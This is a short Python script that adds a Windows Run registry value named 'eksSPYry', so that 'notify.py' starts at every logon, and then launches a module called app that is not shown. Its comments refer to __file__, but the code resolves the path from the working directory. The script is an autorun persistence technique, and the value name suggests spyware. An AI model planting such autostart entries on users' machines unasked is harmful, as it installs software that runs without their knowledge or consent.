import winreg as reg 
import os             

import app


def add_to_registry():

    # in python __file__ is the instant of
    # file path where it was executed 
    # so if it was executed from desktop,
    # then __file__ will be 
    # c:\users\current_user\desktop
    pth = os.path.dirname(os.path.realpath("notify.py"))
    
    # name of the python file with extension
    s_name="notify.py"
    
    # joins the file name to end of path address
    address=os.path.join(pth, s_name) 
    
    # key we want to change is HKEY_CURRENT_USER 
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    # open the key to make changes to
    open_key = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    
    # Modify the opened key
    reg.SetValueEx(open_key,"eksSPYry",0,reg.REG_SZ,address)
    
    # Close the opened key
    reg.CloseKey(open_key)


if __name__ == "__main__":
    add_to_registry()
    app.main()